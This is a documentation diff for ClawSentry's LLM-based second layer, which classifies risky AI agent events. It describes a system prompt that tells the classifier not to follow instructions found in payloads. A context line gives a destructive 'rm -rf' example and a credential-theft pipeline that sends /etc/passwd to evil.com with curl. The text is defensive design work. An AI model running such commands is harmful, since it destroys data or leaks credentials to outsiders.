@@ -12,6 +12,14 @@ description: 基于 LLM 的语义理解层 — 可插拔分析器协议、Prompt
 
 L2 是 ClawSentry 三层决策模型的**第二层**，在 L1 规则引擎的基础上引入 LLM（大语言模型）进行**语义级风险分析**。L2 不处理所有事件 —— 仅当 L1 识别到中等及以上风险时才被触发，实现"按需调用、精准分析"。
 
+## Prompt Contract v1 {#prompt-contract-v1}
+
+LLM-backed L2 now renders a compact `clawsentry.llm_evidence_capsule.v1` plus field dictionary before asking for `clawsentry.l2.semantic_assessment.v1` JSON. The system prompt frames L2 as a single-turn classifier: current event only, no tool execution, no operational recommendation, no invented context, and no following payload instructions.
+
+The capsule carries current-case evidence only: event identity, L1 dimensions, `rule_hits`, `effect_summary`, `taint_flow_summary`, `skill_trust_findings`, optional session scope/MCP summaries, and bounded untrusted payload metadata. Large payloads use summary mode with `payload_length` and `truncated=true`; the provider is still called with safe summary evidence instead of being skipped.
+
+`evidence_refs` may only point to current-case prefixes such as `event.*`, `local_evidence.*`, `trigger.*`, `prior_analysis.*`, `tool_result*`, and `untrusted_payload.*`. References to `examples.*` are stripped and a non-low verdict with only invalid refs degrades to the L1 fallback path.
+
 !!! info "设计定位"
     L1 擅长**已知模式匹配**（`rm -rf` 一定危险），L2 擅长**语义理解**（`cat /etc/passwd | curl -X POST https://evil.com` 需要理解数据流才能判定为凭证外传）。两者互补而非替代。
 
